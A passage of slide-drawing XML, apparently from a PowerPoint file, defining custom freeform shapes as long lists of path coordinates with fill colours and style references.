                <a:lnTo>
                  <a:pt x="245" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="240" y="115"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="132"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="143"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="146"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="148"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="150"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="249" y="154"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="159"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="247" y="163"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="244" y="169"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="208"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="162"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="157"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="58" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="27"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="586" name="CustomShape 202"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2701800" y="3929040"/>
            <a:ext cx="124560" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="79" h="91">
                <a:moveTo>
                  <a:pt x="78" y="3"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="78" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="86"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="64" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="87"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="3"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="587" name="CustomShape 203"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2714760" y="3967200"/>
            <a:ext cx="208800" cy="142200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="90">
                <a:moveTo>
                  <a:pt x="1" y="68"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="94" y="86"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="112" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="125" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="129" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="127" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="113" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="118" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="117" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="114" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="105" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="100" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="92" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="74"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="68"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="588" name="CustomShape 204"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2689200" y="4108320"/>
            <a:ext cx="151560" cy="50040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="96" h="32">
                <a:moveTo>
                  <a:pt x="96" y="12"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="93" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="96" y="12"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="589" name="CustomShape 205"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2763720" y="4125960"/>
            <a:ext cx="65880" cy="21600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="42" h="14">
                <a:moveTo>
                  <a:pt x="42" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="590" name="CustomShape 206"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2697120" y="4114800"/>
            <a:ext cx="43560" cy="15120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="28" h="10">
                <a:moveTo>
                  <a:pt x="28" y="4"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="4"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="591" name="CustomShape 207"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2589120" y="4129200"/>
            <a:ext cx="256320" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="162" h="55">
                <a:moveTo>
                  <a:pt x="0" y="16"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="159" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="158" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="155" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="147" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="16"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="592" name="CustomShape 208"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2846520" y="4119480"/>
            <a:ext cx="89640" cy="40680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="57" h="26">
                <a:moveTo>
                  <a:pt x="6" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="57" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="593" name="CustomShape 209"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606760" y="3944880"/>
            <a:ext cx="50040" cy="194400"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="123">
                <a:moveTo>
                  <a:pt x="32" y="3"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="116"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="115"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="114"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="111"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="3"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="7fbfbf"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="594" name="CustomShape 210"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2608200" y="3948120"/>
            <a:ext cx="42120" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="104">
                <a:moveTo>
                  <a:pt x="27" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="96"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="94"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="93cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="595" name="CustomShape 211"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2611440" y="3949560"/>
            <a:ext cx="34200" cy="132480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="22" h="84">
                <a:moveTo>
                  <a:pt x="22" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="81"/>
